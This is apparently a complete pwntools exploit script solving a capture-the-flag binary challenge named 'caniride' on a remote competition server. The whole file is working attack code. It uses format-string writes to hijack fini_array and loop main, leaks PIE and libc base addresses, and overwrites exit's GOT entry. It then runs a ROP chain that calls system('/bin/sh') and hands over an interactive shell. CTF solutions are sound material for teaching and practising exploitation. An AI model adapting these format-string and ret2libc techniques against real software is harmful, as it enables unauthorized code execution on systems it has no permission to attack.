from pwn import *

p = remote('challs.actf.co', 31228)
# p = process('./caniride')
# p = remote('localhost', 7777)
e = context.binary = ELF('./caniride')
libc = ELF('./libc.so.6')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

fini_array = 0x3300
main_addr = 0x5269
pop_rdi = 0x00023b72
add_rsp_0x78 = 0x0010df06

payload = f'%{main_addr&0xff}c%16$hhn'
payload += f'%{((main_addr>>8)-(main_addr&0xff))&0xff}c%17$hhn'

p.sendlineafter(b'Name: ', payload+'@@@@@%143$p')
p.sendlineafter(b'driver: ', b'-3')
p.recvuntil(b' is ')
e.address = u64(p.recvuntil(b'your')[:-5].ljust(8, b'\x00')) - 0x35a8
log.info('PIE: ' + hex(e.address))

payload = p64(e.address+fini_array)
payload += p64(e.address+fini_array+1)
p.sendlineafter(b'self: ', payload)
p.recvuntil(b'@@@@@')
libc.address = int(p.recvline()[:-2], 16) - (libc.symbols['__libc_start_main']+243)
log.info('libc: ' + hex(libc.address))

addr = libc.address + add_rsp_0x78
print(hex(addr))
payload = f'%{addr&0xffff}c%16$hn'.encode()
payload += f'%{(((addr>>16)&0xffff)-(addr&0xffff))&0xffff}c%17$hn'.encode()

print(payload)
print(len(payload))
p.sendlineafter(b'Name: ', payload)
p.sendlineafter(b'driver: ', b'0')
payload = b''
payload += p64(e.got['exit'])
payload += p64(e.got['exit']+2)
payload += p64(pop_rdi+libc.address+1)*10
payload += p64(pop_rdi+libc.address)
payload += p64(next(libc.search(b'/bin/sh')))
payload += p64(libc.symbols['system'])
p.sendlineafter(b'self: ', payload)

p.interactive()
